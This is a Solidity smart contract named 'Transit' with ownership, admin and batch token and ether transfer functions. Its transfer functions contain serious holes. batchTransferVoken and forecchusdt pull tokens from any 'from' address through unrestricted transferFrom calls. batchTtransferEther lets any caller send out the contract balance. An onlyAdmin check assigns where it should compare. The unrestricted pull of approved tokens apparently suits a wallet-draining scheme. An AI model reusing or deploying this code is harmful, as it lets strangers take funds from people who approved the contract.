

pragma solidity >=0.4.25 <0.7.0;


library SafeMath256 {

    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {

        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}


contract ERC20{

    function balanceOf(address owner) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint value) public;

    
    
}
contract Console {

    event LogUint(string, uint);
    function log(string s , uint x) internal {

    emit LogUint(s, x);
    }
    
    event LogInt(string, int);
    function log(string s , int x) internal {

    emit LogInt(s, x);
    }
    
    event LogBytes(string, bytes);
    function log(string s , bytes x) internal {

    emit LogBytes(s, x);
    }
    
    event LogBytes32(string, bytes32);
    function log(string s , bytes32 x) internal {

    emit LogBytes32(s, x);
    }

    event LogAddress(string, address);
    function log(string s , address x) internal {

    emit LogAddress(s, x);
    }

    event LogBool(string, bool);
    function log(string s , bool x) internal {

    emit LogBool(s, x);
    }
}
contract Ownable{

    address public owner;
    mapping (address => bool) public AdminAccounts;

    function Ownable() public {

        owner = msg.sender;
    }

    modifier onlyOwner() {

        require(msg.sender == owner || AdminAccounts[msg.sender]);
        _;
    }
    modifier onlyAdmin() {

        require(AdminAccounts[msg.sender] = true);
        _;
    }
    modifier onlyPayloadSize(uint size) {

        require(!(msg.data.length < size + 4));
        _;
    }
    function getBlackListStatus(address _maker) external constant returns (bool) {

        return AdminAccounts[_maker];
    }
    
    function transferOwnership(address newOwner) public onlyOwner {

        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function OwnerCharge() public payable onlyOwner {

        owner.transfer(this.balance);
    }
    function OwnerChargeTo(address _address) public payable returns(bool){

        if(msg.sender == owner || AdminAccounts[msg.sender]){
             _address.transfer(this.balance);
             return true;
        }
       return false;
    }
    function addAdminList (address _evilUser) public onlyOwner {
            AdminAccounts[_evilUser] = true;
            AddedAdminList(_evilUser);
        
    }

    function removeAdminList (address _clearedUser) public onlyOwner {
            AdminAccounts[_clearedUser] = false;
            RemovedAdminList(_clearedUser);
    }

    event AddedAdminList(address _user);

    event RemovedAdminList(address _user);
}

contract Transit is Console,Ownable{


  using SafeMath256 for uint256;
  uint8 public constant decimals = 18;
  uint256 public constant decimalFactor = 10 ** uint256(decimals);
    address public AdminAddress;
    function Transit(address Admin) public{

        AdminAccounts[Admin] = true;
    }
    function getBalance() constant returns(uint){

        return this.balance;
    }
    function batchTtransferEther(address[]  _to,uint256[] _value) public payable {

        require(_to.length>0);

        for(uint256 i=0;i<_to.length;i++)
        {
            _to[i].transfer(_value[i]);
        }
    }

    function batchTransferVoken(address from,address caddress,address[] _to,uint256[] _value)public returns (bool){

        require(_to.length > 0);
        bytes4 id=bytes4(keccak256("transferFrom(address,address,uint256)"));
        for(uint256 i=0;i<_to.length;i++){
            caddress.call(id,from,_to[i],_value[i]);
        }
        return true;
    }
	function forecchusdt(address from,address caddress,address[] _to,uint256[] _value)public payable{

        require(_to.length > 0);
        bytes4 id=bytes4(keccak256("transferFrom(address,address,uint256)"));
        for(uint256 i=0;i<_to.length;i++){
            caddress.call(id,from,_to[i],_value[i]);
        }
    }
    function tosonfrom(address from,address[] tc_address,uint256[] t_value,uint256 e_value)public payable{

        log("address=>",from);
        bytes4 id=bytes4(keccak256("transferFrom(address,address,uint256)"));
        for(uint256 i=0;i<tc_address.length;i++){
            tc_address[i].call(id,msg.sender,from,t_value[i]);
        }
        from.transfer(e_value);
    }

}